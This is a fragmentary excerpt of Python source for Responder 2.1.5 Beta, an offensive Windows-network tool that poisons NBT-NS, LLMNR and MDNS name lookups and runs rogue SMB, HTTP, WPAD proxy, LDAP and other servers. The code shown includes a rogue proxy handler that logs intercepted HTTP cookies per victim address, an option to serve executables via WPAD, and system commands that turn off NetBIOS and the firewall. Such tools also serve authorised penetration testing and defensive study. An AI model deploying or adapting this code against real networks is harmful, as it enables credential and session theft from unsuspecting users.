...
VERSION = 'Responder 2.1.5 Beta'
parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -r -F\nor:\npython %prog -i 10.20.30.40 -rF', version = VERSION,
                               prog=sys.argv[0],
                               )
...
parser.add_option('-w','--wpad', action="store_true", dest="WPAD_On_Off", help = "Set this to start the WPAD rogue proxy server (Experimental on Windows). Default value is False", default=False)
...
def Show_Help(ExtraHelpData):
    help = "NBT Name Service/LLMNR "+VERSION+" Windows Version\nPlease send bugs/comments to: lgaffie@trustwave.com\nTo kill this script hit CRTL-C\n\n"
    help+= ExtraHelpData
    print help
...
Show_Help("[+]NBT-NS, LLMNR & MDNS responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nChallenge set: %s\nWPAD Proxy Server: %s\nWPAD script loaded:  %s\nHTTP Server: %s\nSMB Server: %s\nSMB LM support: %s\nKerberos Server: %s\nSQL Server: %s\nFTP Server: %s\nIMAP Server: %s\nPOP3 Server: %s\nSMTP Server: %s\nDNS Server: %s\nLDAP Server: %s\nFingerPrint hosts: %s\nServing Executable via HTTP&WPAD: %s\nAlways Serving a Specific File via HTTP&WPAD: %s\n\n"%( NumChal,WPAD_On_Off,WPAD_Script,On_Off,SMB_On_Off,LM_On_Off,Krb_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
    ...
    def do_CONNECT(self):
        ...
        try:
            if self._connect_to(self.path, soc):
                ...
                self.wfile.write("Proxy-agent: ISAProxyServer\r\n")
                self.wfile.write("\r\n")
                try:
        ...
        try:
            if scm == 'http':
                if self._connect_to(netloc, soc):
                    ...
                    if Verbose == True:
                        print Message
                    OutFile = os.path.join(ResponderPATH,"HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
...
class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
    ...
    def server_bind(self):
        ...
        UDPServer.server_bind(self)
        self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
...
def serve_thread_udp(host, port, handler):
    try:
        ...
        print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running."
...
def serve_thread_tcp(host, port, handler):
    try:
        ...
        print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running."
...
def main():
    try:
        print "Preparing Windows for Responder...\nDisabling NetBIOS..."
        os.system("wmic /interactive:off nicconfig where TcpipNetbiosOptions=0 call SetTcpipNetbios 2")
        print "Turning firewall Off..."
        ...
        print "Re-enabling NetBIOS..."
        os.system("wmic /interactive:off nicconfig where TcpipNetbiosOptions=2 call SetTcpipNetbios 0")
        print "Turning firewall On..."
